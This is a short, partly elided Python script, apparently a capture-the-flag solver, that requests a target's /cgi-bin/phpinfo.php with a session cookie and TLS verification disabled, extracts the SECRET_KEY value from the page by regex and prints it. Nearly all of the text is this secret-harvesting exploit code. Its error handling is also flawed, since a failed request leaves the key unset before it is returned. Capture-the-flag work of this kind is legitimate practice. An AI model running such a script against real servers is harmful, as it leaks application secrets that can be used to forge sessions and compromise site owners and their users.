...
def solution(s,url,cookie):
    URL=url+"/cgi-bin/phpinfo.php"
    try:
        res=s.get(URL,verify=False,cookies=cookie,allow_redirects=True,timeout=1)
        secret_key=re.search(r'SECRET_KEY\s*</td><td class="v">([^<]+)',res.text)
    except Exception as e :
        print(colored(e,'red'))
    return secret_key.group(1)
...
def main():
    ...
    s=requests.session()
    secret_key=solution(s=s,url=URL,cookie=cookie)

    print(colored(secret_key,'green'))
